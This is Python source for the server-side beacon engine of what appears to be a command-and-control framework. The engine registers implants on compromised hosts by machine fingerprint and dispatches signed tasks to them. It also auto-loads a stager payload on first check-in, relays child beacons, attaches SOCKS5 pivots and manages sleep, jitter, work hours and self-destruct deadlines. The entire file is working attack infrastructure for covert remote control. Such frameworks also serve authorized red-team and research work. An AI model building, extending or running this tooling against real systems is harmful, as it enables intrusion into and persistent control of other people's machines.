"""Beacon engine — session registry and task dispatcher.

This is the single source of truth for beacon state. The listener reads
and writes through it; the console reads through it. All mutation is
serialized under one lock so the engine can be called from the HTTP
listener thread and the operator console simultaneously.
"""

from __future__ import annotations

import hashlib
import os
import threading
import time
from typing import Dict, List, Optional, Tuple

from . import constants
from .protocol import Result, Task
from .session import BeaconSession


def _fingerprint(identity: dict) -> str:
    """Stable fingerprint over the fields that survive reimaging.

    Machine-id alone is not enough — the Windows MachineGuid and Linux
    /etc/machine-id are stable across reboots but not across some
    imaging operations. Including hostname and username makes the
    fingerprint resilient while still unique.
    """
    h = hashlib.sha256()
    for key in ('machine_id', 'hostname', 'username', 'os'):
        h.update(str(identity.get(key, '')).encode('utf-8', 'replace'))
        h.update(b'\x00')
    return h.hexdigest()[:32]


class BeaconEngine:
    """Central coordinator for all beacon sessions."""

    def __init__(self, handler):
        self.handler = handler
        self.sessions: Dict[int, BeaconSession] = {}
        self._by_fingerprint: Dict[str, int] = {}
        self._by_fingerprint_seen: Dict[str, float] = {}
        self._lock = threading.RLock()
        self._counter = 1000
        self._waiter_handoff: Dict[str, object] = {}

        try:
            from .crypto import TaskSigner
            self.signer = TaskSigner(handler.signer)
        except Exception:
            self.signer = None

        self._reaper_stop = threading.Event()
        self._reaper = threading.Thread(
            target=self._expire_loop, daemon=True,
        )
        self._reaper.start()

        import secrets as _secrets
        self._cookie_key = _secrets.token_bytes(32)
        self._by_cookie: Dict[str, int] = {}
        self.pivot = None
        self.webhooks = None

        try:
            from .scheduler import Scheduler
            self.scheduler = Scheduler(self)
        except Exception:
            self.scheduler = None

    def session_by_fingerprint(self, fingerprint: str):
        """Return the session for a fingerprint, or None. Used by
        the relay path: the parent posts with X-Relay-Child set to
        the child's fingerprint, and the listener resolves the
        session here."""
        if not fingerprint:
            return None
        with self._lock:
            sid = self._by_fingerprint.get(fingerprint)
            if sid is None:
                return None
            return self.sessions.get(sid)

    def handle_relayed_checkin(self, parent_session, child_payload: dict):
        """Handle a check-in that arrived over a relay.

        `parent_session` is the beacon that relayed the payload.
        `child_payload` is the child's identity and optional pubkey,
        identical in shape to a direct HTTP check-in.

        The engine treats the relayed check-in exactly like a
        direct one: the child gets its own session id, its own
        cookie, its own log directory. The parent's session is
        untouched.
        """

        if parent_session is None:
            return None
        return self.handle_checkin(child_payload)

    # ------------------------------------------------------------------
    # Pivot attachment

    def attach_pivot_manager(self, pivot_manager) -> None:
        """Attach a SOCKS5 pivot manager to this engine.

        The engine does not create the pivot manager itself because
        the pivot listener port is a handler-level concern. The
        handler constructs the manager, binds the listener, and hands
        it here. The beacon console reads ``self.engine.pivot`` to
        start and stop per-session proxies.
        """
        self.pivot = pivot_manager

    # ------------------------------------------------------------------
    # Webhook dispatch

    def attach_webhooks(self, webhooks) -> None:
        """Attach a WebhookStore to this engine.

        The engine does not construct the store itself — the
        store is an operator-facing concern owned by the
        OperatorListener, which builds it from
        logs/webhooks.json. When the listener is up, it calls
        this; before that, every fire_webhook is a no-op.
        """
        self.webhooks = webhooks

    def fire_webhook(self, event: str, payload: dict,
                     severity: str = 'info') -> None:
        """Dispatch a webhook event if a store is attached.

        Never raises. A webhook failure must not interrupt beacon
        handling — the store already swallows per-dispatch
        exceptions, but a stale or mis-shaped store would raise on
        the .fire() call itself.
        """
        store = self.webhooks
        if store is None:
            return
        try:
            store.fire(event, payload, severity=severity)
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Cookie issue / verify

    def issue_cookie(self, session_id: int) -> str:
        """Return a fresh cookie for `session_id` and record the
        mapping. Called at the end of every successful check-in, so
        the cookie rotates on each check-in the way real session
        cookies do."""
        import base64 as _b64
        import hmac as _hmac
        import hashlib as _hashlib
        import secrets as _secrets

        nonce = _secrets.token_bytes(16)
        mac = _hmac.new(self._cookie_key, nonce, _hashlib.sha256).digest()
        cookie = (
            _b64.urlsafe_b64encode(nonce).rstrip(b'=').decode('ascii')
            + '.'
            + _b64.urlsafe_b64encode(mac).rstrip(b'=').decode('ascii')
        )
        with self._lock:
            sess = self.sessions.get(session_id)
            if sess is not None and sess.cookie:
                self._by_cookie.pop(sess.cookie, None)
            self._by_cookie[cookie] = session_id
            if sess is not None:
                sess.cookie = cookie
        return cookie

    def verify_cookie(self, cookie: str) -> Optional[int]:
        """Return the session id for `cookie`, or None if the cookie
        is missing, malformed, has a bad MAC, or refers to a session
        the engine no longer tracks."""
        import base64 as _b64
        import hmac as _hmac
        import hashlib as _hashlib

        if not cookie or '.' not in cookie:
            return None
        try:
            nonce_b64, mac_b64 = cookie.split('.', 1)
            pad = lambda s: s + '=' * (-len(s) % 4)
            nonce = _b64.urlsafe_b64decode(pad(nonce_b64))
            mac = _b64.urlsafe_b64decode(pad(mac_b64))
        except Exception:
            return None

        expected = _hmac.new(
            self._cookie_key, nonce, _hashlib.sha256).digest()
        try:
            if not _hmac.compare_digest(expected, mac):
                return None
        except Exception:
            return None

        with self._lock:
            sid = self._by_cookie.get(cookie)
            if sid is None:
                return None
            if sid not in self.sessions:
                return None
        return sid


    def rotate_cookies(self) -> int:
        """Regenerate the cookie signing key. Every existing cookie
        becomes invalid on its next use; beacons re-check-in within
        one sleep interval and receive fresh cookies.

        Returns the number of live sessions whose cookies were
        invalidated. Use when a cookie is suspected to have leaked —
        via a captured request, a proxy log, or an untrusted client
        machine — and you need to force every beacon to re-prove
        itself without restarting the handler.
        """
        import secrets as _secrets
        with self._lock:
            n = len(self.sessions)
            self._cookie_key = _secrets.token_bytes(32)
            self._by_cookie.clear()
            for s in self.sessions.values():
                s.cookie = None
        return n

    def _expire_loop(self) -> None:
        """Every 5 minutes, forget beacons that have gone permanently
        silent. A beacon is considered permanently lost after
        EXPIRE_AFTER * BEACON_TTL_FACTOR missed check-ins.
        """

        while not self._reaper_stop.wait(300):
            try:
                now = time.time()
                to_forget = []
                with self._lock:
                    for sid, s in self.sessions.items():
                        confirmed = getattr(
                            s, '_confirmed_sleep', s.sleep_interval)
                        effective = max(s.sleep_interval, confirmed)
                        ttl = max(
                            effective * constants.BEACON_TTL_FACTOR, 60)
                        if (now - s.last_seen) > \
                                ttl * constants.BEACON_EXPIRE_MULTIPLIER:
                            to_forget.append(sid)
                for sid in to_forget:
                    self.forget(sid)

                cutoff = now - (
                    constants.BEACON_TTL_FACTOR *
                    constants.BEACON_EXPIRE_MULTIPLIER * 30 * 86400)

                cutoff = max(cutoff, now - 86400.0)
                with self._lock:
                    stale_fp = [
                        fp for fp, seen in
                        self._by_fingerprint_seen.items()
                        if seen < cutoff
                    ]
                    for fp in stale_fp:
                        sid = self._by_fingerprint.get(fp)
                        if sid is not None and sid in self.sessions:
                            continue
                        self._by_fingerprint.pop(fp, None)
                        self._by_fingerprint_seen.pop(fp, None)

                soon = []
                now = time.time()
                with self._lock:
                    for s in self.sessions.values():
                        if not s.kill_deadline:
                            continue
                        if not (0 < s.kill_deadline - now < 86400):
                            continue
                        if getattr(s, '_kill_notified_at',
                                   None) == s.kill_deadline:
                            continue
                        s._kill_notified_at = s.kill_deadline
                        soon.append(s)
                if soon:
                    try:
                        from .. import notify
                        names = ', '.join(
                            f"#{s.id}" for s in soon[:5])
                        if len(soon) > 5:
                            names += f' (+{len(soon) - 5} more)'
                        notify.send(
                            f"{len(soon)} beacon(s) nearing "
                            f"self-destruct",
                            names)
                    except Exception:
                        pass

                    for s in soon:
                        remaining_h = max(
                            0, int((s.kill_deadline - now) / 3600))
                        self.fire_webhook(
                            'kill-deadline',
                            {
                                'id':   s.id,
                                'host': s.display_name,
                                'remaining_hours': remaining_h,
                            },
                            severity='warn')
            except Exception:
                pass

    # ------------------------------------------------------------------
    # Lookup

    def get(self, session_id: int) -> Optional[BeaconSession]:
        with self._lock:
            return self.sessions.get(session_id)

    def list_all(self) -> List[BeaconSession]:
        with self._lock:
            return list(self.sessions.values())

    def list_alive(self) -> List[BeaconSession]:
        with self._lock:
            return [s for s in self.sessions.values() if s.alive]

    # ------------------------------------------------------------------
    # Check-in

    def handle_checkin(self, data: dict) -> dict:
        identity = data.get('identity') or {}

        if not identity.get('machine_id'):
            return None
        fp = _fingerprint(identity)
        pubkey_pem = data.get('agent_pubkey') or ''

        with self._lock:
            session = self._lookup_or_create(
                fp, identity, addr=data.get('addr'))

            if pubkey_pem:
                presented = self._parse_pubkey(pubkey_pem)

                identity_sig = data.get('identity_sig') or ''
                try:
                    identity_ts = int(data.get('identity_ts') or 0)
                except (TypeError, ValueError):
                    if session.logger:
                        session.logger.log_event(
                            "REJECTED: check-in identity_ts "
                            "is not an integer")
                    return None

                if identity_sig:
                    if abs(time.time() - identity_ts) > 300:
                        if session.logger:
                            session.logger.log_event(
                                "REJECTED: check-in identity_ts "
                                "outside +/- 300s window")
                        return None
                    payload = ('%s|%s|%s|%s|%d' % (
                        identity.get('machine_id', ''),
                        identity.get('hostname', ''),
                        identity.get('username', ''),
                        identity.get('os', ''),
                        identity_ts,
                    )).encode('utf-8')
                    if not self._verify_identity_signature(
                            presented, identity_sig, payload):
                        if session.logger:
                            session.logger.log_event(
                                "REJECTED: check-in identity "
                                "signature invalid")
                        return None

                if session.agent_pubkey is None:
                    session.agent_pubkey = presented
                    if not identity_sig and session.logger:
                        try:
                            session.logger.log_event(
                                "WARNING: check-in pinned without "
                                "identity signature — rebuild the "
                                "agent to enable the signed-"
                                "identity check")
                        except Exception:
                            pass
                elif (presented is not None and
                      session.agent_pubkey is not None and
                      presented.public_numbers() !=
                          session.agent_pubkey.public_numbers()):
                    if session.logger:
                        try:
                            session.logger.log_event(
                                "REJECTED: beacon check-in with "
                                "mismatched public key")
                        except Exception:
                            pass

                    try:
                        session._identity_mismatch_attempts = (
                            getattr(session,
                                    '_identity_mismatch_attempts',
                                    0) + 1)
                    except Exception:
                        pass

                    self.fire_webhook(
                        'beacon-identity-mismatch',
                        {
                            'id':       session.id,
                            'host':     session.display_name,
                            'attempts': getattr(
                                session,
                                '_identity_mismatch_attempts', 1),
                        },
                        severity='crit')
                    return None

            if data.get('addr'):
                session.last_addr = data.get('addr')
            session.last_seen = time.time()
            session.checkins += 1
            first_checkin = (session.checkins == 1)

            # Log re-check-ins here rather than in _lookup_or_create,
            # so the address is the one received on this request.
            if not first_checkin and session.logger is not None:
                try:
                    session.logger.log_event(
                        f"Re-check-in from "
                        f"{session.last_addr or '?'}")
                except Exception:
                    pass

        self._touch_registry(session)

        cookie = self.issue_cookie(session.id)

        if first_checkin:
            os_name = session.identity.get('os', '?')
            arch = session.identity.get('arch', '?')
            try:
                c = getattr(self.handler, 'colors', {})
                print(
                    f"{c.get('green','')}[BEACON] New beacon "
                    f"#{session.id}: {session.display_name} "
                    f"({os_name}/{arch}) | beacon {session.id}"
                    f"{c.get('end','')}"
                )
            except Exception:
                pass
            try:
                from .. import notify
                notify.send(
                    f"New beacon #{session.id}",
                    f"{session.display_name} "
                    f"({os_name}/{arch})")
            except Exception:
                pass

            self.fire_webhook(
                'new-beacon',
                {
                    'id':   session.id,
                    'user': session.identity.get('username', '?'),
                    'host': session.identity.get('hostname', '?'),
                    'os':   os_name,
                    'arch': arch,
                },
                severity='info')

        if session.identity.get('stager') and first_checkin:
            try:
                from .stager import PayloadRegistry
                reg = PayloadRegistry()
                chosen = None
                default_name = os.environ.get(
                    'TORNADO_STAGER_PAYLOAD', '')
                if default_name:
                    chosen = reg.get(default_name)
                if chosen is None:
                    entries = reg.list()
                    if len(entries) == 1:
                        chosen = entries[0]
                if chosen is not None:
                    self.enqueue(
                        session.id, 'stage_load',
                        [chosen['name'],
                         chosen['sha256'],
                         str(chosen['size'])],
                        timeout=300, track=False)
            except Exception:
                pass

        return {
            'id':            session.id,
            'sleep':         session.sleep_interval,
            'jitter':        session.jitter,
            'kill_deadline': session.kill_deadline,
            'proto':         constants.PROTO_VERSION,
            'cookie':        cookie,
        }


    def _lookup_or_create(self, fp: str, identity: dict,
                          addr: str = None) -> BeaconSession:

        self._by_fingerprint_seen[fp] = time.time()
        existing = self._by_fingerprint.get(fp)
        if existing is not None:
            session = self.sessions.get(existing)
            if session is not None:
                return session
            session = BeaconSession(existing, identity, fp)
            session.checkins = 1
        else:
            self._counter += 1
            session = BeaconSession(self._counter, identity, fp)
            self._by_fingerprint[fp] = session.id
        kd = identity.get('kill_days')
        if kd is None:
            kill_days = constants.DEFAULT_KILL_DAYS
        else:
            try:
                kill_days = int(kd)
            except (TypeError, ValueError):
                kill_days = constants.DEFAULT_KILL_DAYS
        if kill_days <= 0:
            session.kill_deadline = 0.0
        else:
            session.kill_deadline = time.time() + kill_days * 86400
        if addr:
            session.last_addr = addr
        self.sessions[session.id] = session

        try:
            from ..session_log import SessionLogger
            user = identity.get('username', 'unknown') or 'unknown'
            host = identity.get('hostname', 'unknown') or 'unknown'
            ip   = session.last_addr or '0.0.0.0'
            sid  = f"b{session.id:03d}_{user}@{host}_{ip}_beacon"

            if session.logger is None:
                session.logger = SessionLogger(sid)
                session.logger.log_event(
                    f"Beacon check-in from {ip} "
                    f"({identity.get('os','?')}/"
                    f"{identity.get('arch','?')})")
        except Exception:
            session.logger = None

        return session

    def _touch_registry(self, session: BeaconSession) -> None:
        """Push beacon state into the shared registry. Failure here is
        never fatal — the beacon engine keeps its own copy of the data
        regardless of whether the registry accepts it."""
        try:
            registry = self.handler.registry
            info = {
                'kind':        'beacon',
                'id':          session.id,
                'fingerprint': session.fingerprint,
                'type':        session.identity.get('os', 'unknown'),
                'addr':        (session.last_addr or '0.0.0.0', 0),
                'direction':   'beacon',
                'sysinfo':     dict(session.identity),
                'identity':    dict(session.identity),
                'connect_count': session.checkins,
            }
            registry.register_active(info, session.fingerprint, '')
        except Exception:
            pass

    # ------------------------------------------------------------------
    # Task dispatch
    def enqueue(self, session_id: int, verb: str,
                args: Optional[List[str]] = None,
                timeout: int = 60,
                track: bool = True,
                queued_by: str = '') -> Optional[str]:
        """Queue a task for a session.

        `track` controls whether the waiter is stashed in
        `_waiter_handoff` for the console's async delivery path. Set
        it to False when the caller will wait on the result itself
        via `session.await_result`, otherwise the handoff entry is
        never consumed and the map grows unbounded.

        `queued_by` is attached to the Task for introspection — the
        operator name from the request thread, or a synthetic tag
        for scheduler-fired tasks. Not part of the signature.
        """
        session = self.get(session_id)
        if session is None:
            return None
        sign = None
        if self.signer is not None and self.signer.enabled:
            sign = self.signer.sign_task
        result = session.enqueue(verb, args, timeout, sign=sign,
                                 queued_by=queued_by)
        if result is None:
            return None
        task_id, waiter = result
        if track:
            with self._lock:
                self._waiter_handoff[task_id] = waiter
        if session.logger is not None:
            try:
                preview = ' '.join(str(a) for a in (args or []))
                if len(preview) > 200:
                    preview = preview[:197] + '...'
                session.logger.log_event(
                    f"QUEUED {verb} {preview}".rstrip())
            except Exception:
                pass
        return task_id

    def take_waiter(self, task_id: str):
        """Pop the waiter for `task_id`, or None if the result
        already arrived. Called by the console immediately after
        enqueue."""
        with self._lock:
            return self._waiter_handoff.pop(task_id, None)

    def cancel(self, session_id: int, task_id: str,
               requester: str, role: str = ''
               ) -> Tuple[bool, str]:
        """Cancel a queued task on a session.

        Only the operator who queued the task, or an admin on a
        system-queued task, may cancel it. The authorization
        decision lives on the session — this method forwards the
        requester's identity through and clears the console's
        waiter-handoff slot on success.

        Returns `(ok, reason)`; see `BeaconSession.cancel` for
        the reason vocabulary.
        """
        session = self.get(session_id)
        if session is None:
            return False, 'no_session'
        try:
            ok, reason = session.cancel(
                task_id, requester, role=role)
        except Exception:
            ok, reason = False, 'internal'
        if ok:
            with self._lock:
                self._waiter_handoff.pop(task_id, None)
        return ok, reason

    def pop_tasks(self, session_id: int,
                  max_batch: int = constants.TASK_BATCH_MAX) -> List[Task]:
        session = self.get(session_id)
        if session is None:
            return []

        session.last_seen = time.time()
        session._confirmed_sleep = session.sleep_interval

        tasks: List[Task] = []
        for _ in range(max_batch):
            t = session.pop_task()
            if t is None:
                break
            tasks.append(t)
        if tasks and session.logger is not None:
            try:
                for t in tasks:
                    preview = ' '.join(str(a) for a in (t.args or []))
                    if len(preview) > 200:
                        preview = preview[:197] + '...'
                    session.logger.log_event(
                        f"DELIVERED {t.verb} {preview}".rstrip())
            except Exception:
                pass
        return tasks

    def schedule_sync_tasks(self, session) -> list:
        """Return synthetic Task objects that bring `session`'s
        agent in sync with the server's current scheduling
        parameters. Empty when the agent is already in sync.

        Called by header-less transports (DNS) on every /tasks
        poll, because those transports cannot carry the
        X-Beacon-Sleep / X-Beacon-Jitter / X-Beacon-WorkStart /
        X-Beacon-WorkEnd headers the HTTP transport pushes on
        every response. Tasks are signed with the same signer the
        ordinary task queue uses, so the agent's signature check
        accepts them.

        Kill-deadline changes cannot be propagated this way — the
        agent has no verb for it and the HTTP path delivers it
        purely via the X-Beacon-Kill header. A DNS-transport
        session therefore keeps its build-time kill deadline for
        its whole life.
        """
        from .protocol import Task, new_task_id

        current = (
            session.sleep_interval,
            round(session.jitter, 4),
            session.work_hours_start,
            session.work_hours_end,
        )

        if not hasattr(session, '_last_pushed_schedule'):
            session._last_pushed_schedule = current
            return []

        prev = session._last_pushed_schedule

        if current == prev:
            return []
        session._last_pushed_schedule = current

        pairs = []

        if prev[2] != current[2] or prev[3] != current[3]:
            if current[2] == current[3]:
                pairs.append(('workhours', ['off']))
            else:
                hs, ms = divmod(current[2], 60)
                he, me = divmod(current[3], 60)
                pairs.append(('workhours',
                              [f'{hs:02d}:{ms:02d}',
                               f'{he:02d}:{me:02d}']))

        if prev[0] != current[0] or prev[1] != current[1]:
            pairs.append(('sleep',
                          [str(current[0]),
                           f'{current[1]:.4f}']))

        out = []
        for verb, args in pairs:
            t = Task(id=new_task_id(), verb=verb, args=args,
                     timeout=10)
            if self.signer is not None and self.signer.enabled:
                try:
                    t.signature = self.signer.sign_task(
                        t.unsigned()) or ''
                except Exception:
                    t.signature = ''
            out.append(t)
        return out

    def await_result(self, session_id: int, task_id: str,
                     timeout: float = constants.TASK_TIMEOUT):
        """Return the result for `task_id`, blocking up to
        `timeout` seconds.

        Two-layer lookup. The session path is the normal case: the
        waiter is in `session.pending`, `wait()` blocks until the
        result arrives, and the result is returned. This is what
        the local console uses and it works.

        The remote operator client hits a race the local console
        does not: a beacon on sleep=0 posts its result within
        ~150 ms, which is faster than the client's first poll
        reaches this method. `session.deliver_result` has already
        popped the waiter out of `session.pending`, so the session
        path finds nothing and returns None immediately — every
        subsequent poll does the same, and the result sits in the
        waiter object with no reader.

        That waiter object is not lost. `engine.enqueue` stashes it
        in `_waiter_handoff` when `track=True` (the default for
        every remote task), so the engine holds a reference even
        after the session pops it. When the session path misses,
        pop the handoff entry and read the result from the waiter
        directly. `wait(timeout=0)` returns immediately with
        whatever state the waiter is in.

        The handoff entry is popped on every exit path so the map
        cannot grow unbounded — under the current code it leaks one
        entry per remote task, because the console's `take_waiter`
        is never called for tasks dispatched from a remote client.
        """
        session = self.get(session_id)
        if session is None:
            with self._lock:
                self._waiter_handoff.pop(task_id, None)
            return None

        result = session.await_result(task_id, timeout=timeout)
        if result is not None:
            with self._lock:
                self._waiter_handoff.pop(task_id, None)
            return result

        with self._lock:
            waiter = self._waiter_handoff.pop(task_id, None)
        if waiter is None:
            return None
        return waiter.wait(timeout=0)

    # ------------------------------------------------------------------
    # Result delivery

    def store_result(self, session_id: int, wire: dict) -> None:
        session = self.get(session_id)
        if session is None:
            return
        try:
            result = Result.from_wire(wire)
        except Exception:
            return

        if session.agent_pubkey is not None:
            if not self._verify_result_signature(session, result):
                with self._lock:
                    session.rejected_results += 1
                c = getattr(self.handler, 'colors', {})
                try:
                    print(
                        f"{c.get('red','')}[BEACON] Signature verification "
                        f"failed on result for task {result.id} "
                        f"(session #{session.id}, "
                        f"total rejected: {session.rejected_results})"
                        f"{c.get('end','')}"
                    )
                except Exception:
                    pass
                if session.logger:
                    try:
                        session.logger.log_event(
                            f"rejected unsigned/forged result for "
                            f"task {result.id}")
                    except Exception:
                        pass

                self.fire_webhook(
                    'beacon-signature-failure',
                    {
                        'id':             session.id,
                        'host':           session.display_name,
                        'task_id':        result.id,
                        'rejected_total': session.rejected_results,
                    },
                    severity='crit')
                return

        if session.logger is not None:
            try:
                preview = ''
                if result.output:
                    preview = result.output.decode(
                        'utf-8', errors='replace')
                    if len(preview) > 400:
                        preview = preview[:397] + '...'
                    preview = (preview
                               .replace('\r', '\\r')
                               .replace('\n', '\\n'))
                entry = (f"RESULT {result.id} "
                         f"exit={result.exit_code}")
                if result.error:
                    err = result.error.replace('\n', '\\n')
                    entry += f" error={err}"
                if preview:
                    entry += f" out={preview}"
                session.logger.log_event(entry)
            except Exception:
                pass
        session.deliver_result(result)

    def _verify_result_signature(self, session, result) -> bool:
        try:
            from cryptography.hazmat.primitives.asymmetric import ec
            from cryptography.hazmat.primitives import hashes
            import base64 as _b64

            sig = _b64.b64decode(result.signature)
            payload = result.signable()
            session.agent_pubkey.verify(
                sig, payload, ec.ECDSA(hashes.SHA256()))
            return True
        except Exception:
            return False

    # ------------------------------------------------------------------
    # Lifecycle

    def stop(self) -> None:
        """Stop the background sweeper. Safe to call multiple
        times. The production listener never calls this; it exists
        so a test that constructs an engine can tear it down
        without leaking a thread."""
        self._reaper_stop.set()
        self._reaper.join(timeout=5.0)

    def forget(self, session_id: int) -> None:
        if self.scheduler is not None:
            try:
                self.scheduler.remove_for_session(session_id)
            except Exception:
                pass
        if self.pivot is not None:
            try:
                self.pivot.forget_beacon(session_id)
            except Exception:
                pass
        with self._lock:
            session = self.sessions.pop(session_id, None)
            if session is not None:
                stale = [
                    c for c, sid in self._by_cookie.items()
                    if sid == session_id
                ]
                for c in stale:
                    self._by_cookie.pop(c, None)

    @staticmethod
    def _parse_pubkey(pem_str: str):
        try:
            from cryptography.hazmat.primitives import serialization
            return serialization.load_pem_public_key(
                pem_str.encode('utf-8'))
        except Exception:
            return None

    @staticmethod
    def _verify_identity_signature(pubkey, sig_b64: str,
                                   payload: bytes) -> bool:
        """Return True if sig_b64 is a valid ECDSA P-256 signature
        over payload by pubkey. Returns False on any exception —
        a malformed signature is indistinguishable from an invalid
        one for the caller's purposes."""
        try:
            import base64 as _b64
            from cryptography.hazmat.primitives.asymmetric import ec
            from cryptography.hazmat.primitives import hashes
            sig = _b64.b64decode(sig_b64)
            pubkey.verify(sig, payload, ec.ECDSA(hashes.SHA256()))
            return True
        except Exception:
            return False